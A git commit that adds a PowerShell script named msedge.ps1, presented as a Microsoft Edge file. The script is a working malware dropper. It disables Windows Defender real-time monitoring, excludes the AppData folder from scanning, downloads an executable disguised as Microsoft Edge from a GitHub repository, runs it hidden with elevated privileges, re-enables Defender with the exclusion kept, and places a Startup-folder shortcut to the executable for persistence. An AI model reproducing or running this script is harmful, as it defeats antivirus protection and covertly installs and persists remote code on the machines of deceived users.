c65e9e47d476c84e20492b6f7e3b56ab5a7f9d6f
kasaotnic4422 <163497761+kasaotnic4422@users.noreply.github.com>
2024-03-15 01:26:50 -0400

    Add files via upload

---
+++ msedge.ps1
@@ -0,0 +1,22 @@
+# Disable Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Add AppData to Windows Defender Exclusions
+Add-MpPreference -ExclusionPath "$($env:LOCALAPPDATA)"
+
+# Download and Run Exe from GitHub Link
+$url = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/Microsoft%20Edge.exe"
+$outfile = "$($env:TEMP)\Microsoft%20Edge.exe"
+Invoke-WebRequest -Uri $url -OutFile $outfile
+Start-Process -FilePath $outfile -WindowStyle Hidden -Verb runAs
+
+# Re-Enable Windows Defender but keep the AppData Exclusion and Add the Downloaded Exe to Registry Startup
+Set-MpPreference -DisableRealtimeMonitoring $false
+$appPath = "$($env:TEMP)\Microsoft%20Edge.exe"
+$appName = "Microsoft%20Edge"
+$startupFolder = [Environment]::GetFolderPath('Startup')
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "$appName.lnk"
+$shell = New-Object -COM WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $appPath
+$shortcut.Save()
